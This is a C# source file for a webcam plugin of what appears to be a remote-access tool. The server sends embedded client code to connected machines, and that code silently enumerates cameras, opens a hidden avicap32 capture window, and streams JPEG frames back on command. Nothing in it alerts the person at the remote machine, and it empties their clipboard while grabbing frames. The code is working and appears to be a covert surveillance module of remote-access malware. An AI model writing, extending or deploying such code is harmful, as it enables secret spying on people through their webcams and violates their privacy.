// File: Plugins/Builtin/WebcamPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class WebcamPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, WebcamUI> _clientUIs = new();

        public string PluginId => "webcam";
        public string DisplayName => "Webcam";
        public string Version => "1.0.0";
        public string Description => "Remote webcam viewer.";

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_webcam
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts;
        private volatile bool _playing;
        private int _quality = 70;
        private int _selectedDevice = 0;
        private int _targetFps = 30;

        [DllImport(""avicap32.dll"", EntryPoint=""capCreateCaptureWindowW"", CharSet=CharSet.Unicode)]
        static extern IntPtr capCreateCaptureWindow(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);

        [DllImport(""user32.dll"", CharSet=CharSet.Auto)]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport(""user32.dll"")]
        static extern bool DestroyWindow(IntPtr hWnd);

        [DllImport(""avicap32.dll"", EntryPoint=""capGetDriverDescriptionW"", CharSet=CharSet.Unicode)]
        static extern bool capGetDriverDescription(int wDriverIndex, StringBuilder lpszName, int cbName, StringBuilder lpszVer, int cbVer);

        const uint WM_CAP_START = 0x0400;
        const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
        const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
        const uint WM_CAP_SET_PREVIEW = WM_CAP_START + 50;
        const uint WM_CAP_SET_PREVIEWRATE = WM_CAP_START + 52;
        const uint WM_CAP_GET_VIDEOFORMAT = WM_CAP_START + 44;
        const uint WM_CAP_SET_VIDEOFORMAT = WM_CAP_START + 45;
        const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
        const uint WM_CAP_GRAB_FRAME_NOSTOP = WM_CAP_START + 61;
        const uint WM_CAP_EDIT_COPY = WM_CAP_START + 30;
        const uint WM_CAP_SET_CALLBACK_FRAME = WM_CAP_START + 5;
        const uint WM_CAP_SET_SCALE = WM_CAP_START + 53;
        const uint WM_CAP_SEQUENCE_NOFILE = WM_CAP_START + 63;
        const uint WM_CAP_SET_CALLBACK_VIDEOSTREAM = WM_CAP_START + 6;
        const uint WM_CAP_SET_SEQUENCE_SETUP = WM_CAP_START + 64;
        const uint WM_CAP_GET_SEQUENCE_SETUP = WM_CAP_START + 65;

        delegate void FrameCallbackDelegate(IntPtr hWnd, ref VIDEOHDR lpVHdr);

        [StructLayout(LayoutKind.Sequential)]
        struct VIDEOHDR
        {
            public IntPtr lpData;
            public int dwBufferLength;
            public int dwBytesUsed;
            public int dwTimeCaptured;
            public int dwUser;
            public int dwFlags;
            public IntPtr dwReserved0;
            public IntPtr dwReserved1;
            public IntPtr dwReserved2;
            public IntPtr dwReserved3;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFOHEADER
        {
            public int biSize;
            public int biWidth;
            public int biHeight;
            public short biPlanes;
            public short biBitCount;
            public int biCompression;
            public int biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public int biClrUsed;
            public int biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public int pt_x;
            public int pt_y;
        }

        [DllImport(""user32.dll"")]
        static extern bool PeekMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax, uint wRemoveMsg);
        [DllImport(""user32.dll"")]
        static extern bool TranslateMessage(ref MSG lpMsg);
        [DllImport(""user32.dll"")]
        static extern IntPtr DispatchMessage(ref MSG lpMsg);

        [DllImport(""user32.dll"")]
        static extern bool OpenClipboard(IntPtr hWndNewOwner);
        [DllImport(""user32.dll"")]
        static extern bool CloseClipboard();
        [DllImport(""user32.dll"")]
        static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport(""user32.dll"")]
        static extern bool EmptyClipboard();
        [DllImport(""kernel32.dll"")]
        static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport(""kernel32.dll"")]
        static extern bool GlobalUnlock(IntPtr hMem);
        [DllImport(""kernel32.dll"")]
        static extern int GlobalSize(IntPtr hMem);

        const uint CF_DIB = 8;

        private IntPtr _capHwnd = IntPtr.Zero;
        private List<string> _deviceNames = new List<string>();
        private Thread _captureThread;
        private FrameCallbackDelegate _frameCallback;
        private GCHandle _callbackHandle;
        private BITMAPINFOHEADER _currentFormat;
        private bool _formatKnown;

        private byte[] _pendingFrame;
        private readonly object _frameLock = new object();
        private Thread _sendThread;

        private ImageCodecInfo _jpegCodec;
        private EncoderParameters _encParams;

        private volatile bool _gotCallbackFrame;
        private volatile bool _useCallbackMode;

        Task LogA(string msg)
        {
            try
            {
                byte[] b = Encoding.UTF8.GetBytes(msg);
                byte[] m = new byte[b.Length + 1];
                m[0] = 0xFD;
                Buffer.BlockCopy(b, 0, m, 1, b.Length);
                return _send(m);
            }
            catch { return Task.CompletedTask; }
        }

        Task SendAck(byte cmd, string msg)
        {
            byte[] mb = Encoding.UTF8.GetBytes(msg);
            byte[] m = new byte[mb.Length + 2];
            m[0] = 0xFE; m[1] = cmd;
            Buffer.BlockCopy(mb, 0, m, 2, mb.Length);
            return _send(m);
        }

        Task SendErr(byte cmd, string msg)
        {
            byte[] mb = Encoding.UTF8.GetBytes(msg);
            byte[] m = new byte[mb.Length + 2];
            m[0] = 0xFF; m[1] = cmd;
            Buffer.BlockCopy(mb, 0, m, 2, mb.Length);
            return _send(m);
        }

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            _cts = new CancellationTokenSource();

            foreach (var codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == ""image/jpeg"")
                {
                    _jpegCodec = codec;
                    break;
                }
            }
            UpdateEncoderParams();

            Exception initEx = null;
            try
            {
                EnumerateDevices();
                await LogA(""[INIT] Devices="" + _deviceNames.Count);
                await SendDeviceList();
            }
            catch (Exception ex) { initEx = ex; }
            if (initEx != null)
                await LogA(""[INIT] ERROR: "" + initEx.Message);

            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    byte[] data = null;
                    bool fail = false;
                    try { data = await receiveData(); } catch { fail = true; }
                    if (fail || data == null || data.Length == 0) break;

                    Exception cmdEx = null;
                    try { await HandleCmd(data); }
                    catch (Exception ex) { cmdEx = ex; }
                    if (cmdEx != null)
                        await LogA(""[ERR] "" + cmdEx.Message);
                }
            }
            catch { }
            finally { StopCapture(); }
        }

        void UpdateEncoderParams()
        {
            _encParams = new EncoderParameters(1);
            _encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)_quality);
        }

        void EnumerateDevices()
        {
            _deviceNames.Clear();
            for (int i = 0; i < 10; i++)
            {
                var name = new StringBuilder(256);
                var ver = new StringBuilder(256);
                if (capGetDriverDescription(i, name, 256, ver, 256))
                    _deviceNames.Add(name.ToString().Trim());
                else break;
            }
        }

        async Task HandleCmd(byte[] data)
        {
            byte cmd = data[0];
            switch (cmd)
            {
                case 0x01:
                    EnumerateDevices();
                    await SendDeviceList();
                    break;
                case 0x02:
                    if (data.Length >= 2)
                    {
                        int index = data[1];
                        if (index >= 0 && index < _deviceNames.Count)
                        {
                            _selectedDevice = index;
                            await SendAck(0x02, ""Selected: "" + _deviceNames[index]);
                        }
                    }
                    break;
                case 0x03:
                    StopCapture();
                    if (_deviceNames.Count == 0)
                    {
                        await SendErr(0x03, ""No webcam device found"");
                        return;
                    }
                    _playing = true;
                    StartCapture();
                    await SendAck(0x03, ""Capture started"");
                    break;
                case 0x04:
                    StopCapture();
                    await SendAck(0x04, ""Capture stopped"");
                    break;
                case 0x05:
                    if (data.Length >= 2)
                    {
                        _quality = data[1];
                        if (_quality < 1) _quality = 1;
                        if (_quality > 100) _quality = 100;
                        UpdateEncoderParams();
                        await SendAck(0x05, ""Quality="" + _quality);
                    }
                    break;
            }
        }

        void StartCapture()
        {
            _captureThread = new Thread(CaptureLoop);
            _captureThread.SetApartmentState(ApartmentState.STA);
            _captureThread.IsBackground = true;
            _captureThread.Start();

            _sendThread = new Thread(SendLoop);
            _sendThread.IsBackground = true;
            _sendThread.Start();
        }

        void SendLoop()
        {
            while (_playing && !_cts.IsCancellationRequested)
            {
                byte[] frame = null;
                lock (_frameLock)
                {
                    frame = _pendingFrame;
                    _pendingFrame = null;
                }

                if (frame != null)
                {
                    try { _send(frame).Wait(3000); }
                    catch { }
                }
                else
                {
                    Thread.Sleep(1);
                }
            }
        }

        void CaptureLoop()
        {
            IntPtr hwnd = IntPtr.Zero;
            try
            {
                hwnd = capCreateCaptureWindow(""cap"", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
                if (hwnd == IntPtr.Zero)
                {
                    LogA(""[ERR] Failed to create capture window"").Wait(1000);
                    return;
                }
                _capHwnd = hwnd;

                IntPtr result = SendMessage(hwnd, WM_CAP_DRIVER_CONNECT, (IntPtr)_selectedDevice, IntPtr.Zero);
                if (result == IntPtr.Zero)
                {
                    LogA(""[ERR] Failed to connect to webcam device "" + _selectedDevice).Wait(1000);
                    DestroyWindow(hwnd);
                    _capHwnd = IntPtr.Zero;
                    return;
                }

                LogA(""[INFO] Connected to device "" + _selectedDevice).Wait(1000);

                _formatKnown = false;
                int formatSize = (int)SendMessage(hwnd, WM_CAP_GET_VIDEOFORMAT, IntPtr.Zero, IntPtr.Zero);
                if (formatSize >= Marshal.SizeOf(typeof(BITMAPINFOHEADER)))
                {
                    IntPtr fmtBuf = Marshal.AllocHGlobal(formatSize);
                    try
                    {
                        SendMessage(hwnd, WM_CAP_GET_VIDEOFORMAT, (IntPtr)formatSize, fmtBuf);
                        _currentFormat = (BITMAPINFOHEADER)Marshal.PtrToStructure(fmtBuf, typeof(BITMAPINFOHEADER));
                        _formatKnown = true;
                        LogA(""[INFO] Format: "" + _currentFormat.biWidth + ""x"" + Math.Abs(_currentFormat.biHeight) + "" bpp="" + _currentFormat.biBitCount).Wait(1000);
                    }
                    finally { Marshal.FreeHGlobal(fmtBuf); }
                }

                // Try callback mode first
                _gotCallbackFrame = false;
                _useCallbackMode = true;
                _frameCallback = new FrameCallbackDelegate(OnFrame);
                _callbackHandle = GCHandle.Alloc(_frameCallback);
                IntPtr callbackPtr = Marshal.GetFunctionPointerForDelegate(_frameCallback);
                SendMessage(hwnd, WM_CAP_SET_CALLBACK_FRAME, IntPtr.Zero, callbackPtr);
                SendMessage(hwnd, WM_CAP_SET_PREVIEWRATE, (IntPtr)33, IntPtr.Zero);
                SendMessage(hwnd, WM_CAP_SET_PREVIEW, (IntPtr)1, IntPtr.Zero);

                // Pump messages for up to 2 seconds to see if callback fires
                DateTime testStart = DateTime.UtcNow;
                while (_playing && !_cts.IsCancellationRequested && (DateTime.UtcNow - testStart).TotalMilliseconds < 2000)
                {
                    PumpMessages();
                    if (_gotCallbackFrame) break;
                    Thread.Sleep(10);
                }

                if (_gotCallbackFrame)
                {
                    LogA(""[INFO] Using callback mode"").Wait(1000);
                    // Continue with callback mode - just pump messages
                    while (_playing && !_cts.IsCancellationRequested)
                    {
                        PumpMessages();
                        Thread.Sleep(1);
                    }
                }
                else
                {
                    // Callback didn't fire - switch to grab mode
                    _useCallbackMode = false;
                    SendMessage(hwnd, WM_CAP_SET_CALLBACK_FRAME, IntPtr.Zero, IntPtr.Zero);
                    SendMessage(hwnd, WM_CAP_SET_PREVIEW, IntPtr.Zero, IntPtr.Zero);
                    LogA(""[INFO] Callback mode failed, switching to grab mode"").Wait(1000);

                    int frameDelay = 1000 / _targetFps;
                    while (_playing && !_cts.IsCancellationRequested)
                    {
                        DateTime frameStart = DateTime.UtcNow;

                        try
                        {
                            GrabAndEncodeFrame(hwnd);
                        }
                        catch { }

                        PumpMessages();

                        int elapsed = (int)(DateTime.UtcNow - frameStart).TotalMilliseconds;
                        int sleepTime = frameDelay - elapsed;
                        if (sleepTime > 0) Thread.Sleep(sleepTime);
                        else Thread.Sleep(1);
                    }
                }
            }
            catch (Exception ex)
            {
                try { LogA(""[ERR] CaptureLoop: "" + ex.Message).Wait(1000); } catch { }
            }
            finally
            {
                if (hwnd != IntPtr.Zero)
                {
                    try { SendMessage(hwnd, WM_CAP_SET_CALLBACK_FRAME, IntPtr.Zero, IntPtr.Zero); } catch { }
                    try { SendMessage(hwnd, WM_CAP_SET_PREVIEW, IntPtr.Zero, IntPtr.Zero); } catch { }
                    try { SendMessage(hwnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero); } catch { }
                    try { DestroyWindow(hwnd); } catch { }
                    _capHwnd = IntPtr.Zero;
                }
                if (_callbackHandle.IsAllocated) _callbackHandle.Free();
            }
        }

        void PumpMessages()
        {
            MSG msg;
            while (PeekMessage(out msg, IntPtr.Zero, 0, 0, 1))
            {
                TranslateMessage(ref msg);
                DispatchMessage(ref msg);
            }
        }

        void GrabAndEncodeFrame(IntPtr hwnd)
        {
            IntPtr grabResult = SendMessage(hwnd, WM_CAP_GRAB_FRAME_NOSTOP, IntPtr.Zero, IntPtr.Zero);
            if (grabResult == IntPtr.Zero)
            {
                grabResult = SendMessage(hwnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
                if (grabResult == IntPtr.Zero) return;
            }

            // Use clipboard to get the frame
            SendMessage(hwnd, WM_CAP_EDIT_COPY, IntPtr.Zero, IntPtr.Zero);

            if (!OpenClipboard(IntPtr.Zero)) return;
            try
            {
                IntPtr hDib = GetClipboardData(CF_DIB);
                if (hDib == IntPtr.Zero) return;

                IntPtr dibPtr = GlobalLock(hDib);
                if (dibPtr == IntPtr.Zero) return;
                try
                {
                    int dibSize = GlobalSize(hDib);
                    if (dibSize < Marshal.SizeOf(typeof(BITMAPINFOHEADER))) return;

                    BITMAPINFOHEADER bih = (BITMAPINFOHEADER)Marshal.PtrToStructure(dibPtr, typeof(BITMAPINFOHEADER));
                    int w = bih.biWidth;
                    int h = Math.Abs(bih.biHeight);
                    int bpp = bih.biBitCount;
                    if (w <= 0 || h <= 0 || bpp <= 0) return;

                    PixelFormat pf;
                    switch (bpp)
                    {
                        case 24: pf = PixelFormat.Format24bppRgb; break;
                        case 32: pf = PixelFormat.Format32bppRgb; break;
                        case 16: pf = PixelFormat.Format16bppRgb565; break;
                        default: return;
                    }

                    int headerSize = bih.biSize;
                    int colorsUsed = bih.biClrUsed;
                    if (colorsUsed == 0 && bpp <= 8)
                        colorsUsed = 1 << bpp;
                    int paletteSize = colorsUsed * 4;
                    int pixelOffset = headerSize + paletteSize;

                    int stride = ((w * bpp + 31) / 32) * 4;
                    int pixelDataSize = stride * h;

                    if (pixelOffset + pixelDataSize > dibSize) return;

                    IntPtr pixelPtr = IntPtr.Add(dibPtr, pixelOffset);

                    byte[] rawPixels = new byte[pixelDataSize];
                    Marshal.Copy(pixelPtr, rawPixels, 0, pixelDataSize);

                    EncodeAndQueue(rawPixels, w, h, bpp, stride, bih.biHeight > 0, pf);
                }
                finally
                {
                    GlobalUnlock(hDib);
                }
            }
            finally
            {
                EmptyClipboard();
                CloseClipboard();
            }
        }

        void EncodeAndQueue(byte[] rawPixels, int w, int h, int bpp, int stride, bool bottomUp, PixelFormat pf)
        {
            using (var bmp = new Bitmap(w, h, pf))
            {
                var bmpData = bmp.LockBits(new Rectangle(0, 0, w, h), ImageLockMode.WriteOnly, pf);
                try
                {
                    int srcStride = stride;
                    int dstStride = bmpData.Stride;

                    if (bottomUp)
                    {
                        int rowBytes = Math.Min(srcStride, Math.Abs(dstStride));
                        for (int y = 0; y < h; y++)
                        {
                            int srcOffset = (h - 1 - y) * srcStride;
                            if (srcOffset + rowBytes > rawPixels.Length) break;
                            IntPtr dstRow = IntPtr.Add(bmpData.Scan0, y * dstStride);
                            Marshal.Copy(rawPixels, srcOffset, dstRow, rowBytes);
                        }
                    }
                    else
                    {
                        int rowBytes = Math.Min(srcStride, Math.Abs(dstStride));
                        for (int y = 0; y < h; y++)
                        {
                            int srcOffset = y * srcStride;
                            if (srcOffset + rowBytes > rawPixels.Length) break;
                            IntPtr dstRow = IntPtr.Add(bmpData.Scan0, y * dstStride);
                            Marshal.Copy(rawPixels, srcOffset, dstRow, rowBytes);
                        }
                    }
                }
                finally
                {
                    bmp.UnlockBits(bmpData);
                }

                byte[] jpegBytes;
                using (var ms = new MemoryStream())
                {
                    if (_jpegCodec != null)
                        bmp.Save(ms, _jpegCodec, _encParams);
                    else
                        bmp.Save(ms, ImageFormat.Jpeg);
                    jpegBytes = ms.ToArray();
                }

                byte[] msg = new byte[9 + jpegBytes.Length];
                msg[0] = 0x30;
                msg[1] = (byte)(w & 0xFF);
                msg[2] = (byte)((w >> 8) & 0xFF);
                msg[3] = (byte)(h & 0xFF);
                msg[4] = (byte)((h >> 8) & 0xFF);
                int jl = jpegBytes.Length;
                msg[5] = (byte)(jl & 0xFF);
                msg[6] = (byte)((jl >> 8) & 0xFF);
                msg[7] = (byte)((jl >> 16) & 0xFF);
                msg[8] = (byte)((jl >> 24) & 0xFF);
                Buffer.BlockCopy(jpegBytes, 0, msg, 9, jpegBytes.Length);

                lock (_frameLock)
                {
                    _pendingFrame = msg;
                }
            }
        }

        void OnFrame(IntPtr hWnd, ref VIDEOHDR hdr)
        {
            if (!_playing || hdr.lpData == IntPtr.Zero || hdr.dwBytesUsed <= 0) return;
            _gotCallbackFrame = true;
            if (!_useCallbackMode) return;

            try
            {
                if (!_formatKnown) return;

                int w = _currentFormat.biWidth;
                int h = Math.Abs(_currentFormat.biHeight);
                int bpp = _currentFormat.biBitCount;
                if (w <= 0 || h <= 0 || bpp <= 0) return;

                PixelFormat pf;
                switch (bpp)
                {
                    case 24: pf = PixelFormat.Format24bppRgb; break;
                    case 32: pf = PixelFormat.Format32bppRgb; break;
                    case 16: pf = PixelFormat.Format16bppRgb565; break;
                    default: return;
                }

                int stride = ((w * bpp + 31) / 32) * 4;
                int dataSize = stride * h;

                byte[] rawPixels = new byte[dataSize];
                int copyLen = Math.Min(dataSize, hdr.dwBytesUsed);
                Marshal.Copy(hdr.lpData, rawPixels, 0, copyLen);

                EncodeAndQueue(rawPixels, w, h, bpp, stride, _currentFormat.biHeight > 0, pf);
            }
            catch { }
        }

        void StopCapture()
        {
            _playing = false;
            if (_captureThread != null)
            {
                try { _captureThread.Join(3000); } catch { }
                _captureThread = null;
            }
            if (_sendThread != null)
            {
                try { _sendThread.Join(3000); } catch { }
                _sendThread = null;
            }
        }

        async Task SendDeviceList()
        {
            var sb = new StringBuilder();
            for (int i = 0; i < _deviceNames.Count; i++)
            {
                if (i > 0) sb.Append(""\n"");
                sb.Append(i).Append(""|"").Append(_deviceNames[i]);
            }
            byte[] ib = Encoding.UTF8.GetBytes(sb.ToString());
            byte[] msg = new byte[ib.Length + 1];
            msg[0] = 0x06;
            Buffer.BlockCopy(ib, 0, msg, 1, ib.Length);
            await _send(msg);
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            bool isActive = _host.IsPluginActive(context.ClientId, PluginId);
            if (!isActive)
            {
                _ = Task.Run(async () =>
                {
                    try { await _host.StartPluginForClient(context.ClientId, PluginId); }
                    catch { }
                });
            }
            var ui = new WebcamUI(context, _host, this);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            if (_clientUIs.TryGetValue(clientId, out var ui))
                ui.HandleServerData(data);
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui)) ui.Dispose();
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
        }
    }
}
